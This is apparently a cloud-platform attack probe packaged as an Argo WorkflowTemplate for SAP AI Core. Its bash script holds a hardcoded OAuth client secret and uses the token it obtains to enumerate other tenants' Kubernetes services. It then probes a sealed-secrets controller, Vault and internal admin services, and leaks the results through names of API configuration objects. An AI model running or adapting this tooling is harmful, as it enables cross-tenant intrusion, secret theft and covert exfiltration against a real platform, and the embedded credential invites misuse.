apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "51.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V51: Extract services from mt-* namespaces + test connectivity to infra pods
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v51-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        KSM_MULTI="100.110.128.70"

        # 1. Extract services per namespace from KSM-multi
        echo "=== SERVICES PER NS ===" >&2
        MULTI=$(curl -sk --connect-timeout 20 "http://${KSM_MULTI}:8080/metrics" 2>&1)

        # Services in mt-* namespaces
        MT_SVCS=$(echo "$MULTI" | grep 'kube_service_info' | grep 'namespace="mt-' | grep -o 'service="[^"]*".*namespace="[^"]*"' | sort -u | head -20 | tr '\n' '|')
        save "mt-svcs-${MT_SVCS}"

        # Services with their cluster IPs
        SVC_IPS=$(echo "$MULTI" | grep 'kube_service_info' | grep 'namespace="mt-\|namespace="ai-launchpad\|namespace="aicore"' | grep -o 'cluster_ip="[^"]*".*service="[^"]*"' | sort -u | head -15 | tr '\n' '|')
        save "svc-ips-${SVC_IPS}"

        # Service types (ClusterIP, NodePort, LoadBalancer)
        SVC_TYPES=$(echo "$MULTI" | grep 'kube_service_spec_type' | grep -v 'ClusterIP' | head -10 | tr '\n' '|')
        save "svc-types-${SVC_TYPES}"

        # 2. Direct pod connectivity to infrastructure services (from V49 IPs)
        echo "=== POD CONNECTIVITY ===" >&2
        # Try AI Launchpad pods directly by IP
        for ip in 100.64.0.25 100.64.0.26 100.64.0.27 100.64.0.35 100.64.0.39; do
          R=$(curl -sk --connect-timeout 2 "http://${ip}:8080/" 2>&1 | head -c 100)
          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
            save "pod-${ip}-8080-$(echo $R | head -c 80)"
          else
            save "pod-${ip}-8080-blocked"
          fi
        done

        # 3. Try sealed-secrets controller (HIGH VALUE - could decrypt secrets)
        echo "=== SEALED SECRETS ===" >&2
        SS_IP=$(dig +short "sealed-secrets-controller.sealed-secrets.svc.cluster.local" 2>/dev/null | head -1)
        save "ss-ip-${SS_IP:-NXDOMAIN}"
        if [ -n "$SS_IP" ]; then
          R=$(curl -sk --connect-timeout 3 "http://${SS_IP}:8080/healthz" 2>&1 | head -c 100)
          save "ss-health-${R}"
          R2=$(curl -sk --connect-timeout 3 "http://${SS_IP}:8080/v1/cert.pem" 2>&1 | head -c 150)
          save "ss-cert-${R2}"
        fi

        # 4. Cluster-secrets namespace probing
        echo "=== CLUSTER SECRETS ===" >&2
        for svc in vault vault-agent vault-internal; do
          ip=$(dig +short "${svc}.cluster-secrets.svc.cluster.local" 2>/dev/null | head -1)
          [ -n "$ip" ] && save "csec-${svc}-${ip}"
        done

        # 5. Try reachable infrastructure services from pod
        echo "=== INFRA REACH ===" >&2
        # AI Launchpad core-admin (V49 confirmed this service exists)
        R=$(curl -sk --connect-timeout 3 "http://ai-launchpad-core-admin-svc.ai-launchpad.svc.cluster.local/" 2>&1 | head -c 150)
        save "lp-admin-$(echo $R | head -c 100)"

        # AI Launchpad LLM service
        R=$(curl -sk --connect-timeout 3 "http://ai-launchpad-llm-svc.ai-launchpad.svc.cluster.local/" 2>&1 | head -c 150)
        save "lp-llm-$(echo $R | head -c 100)"

        # Context registry
        R=$(curl -sk --connect-timeout 3 "http://context-registry.context-registry.svc.cluster.local/" 2>&1 | head -c 150)
        save "ctx-reg-$(echo $R | head -c 100)"

        # User management
        R=$(curl -sk --connect-timeout 3 "http://user-management.user-management.svc.cluster.local/" 2>&1 | head -c 150)
        save "user-mgmt-$(echo $R | head -c 100)"

        # Metering
        R=$(curl -sk --connect-timeout 3 "http://metering.metering.svc.cluster.local/" 2>&1 | head -c 150)
        save "metering-$(echo $R | head -c 100)"

        echo "V51 DONE" >&2
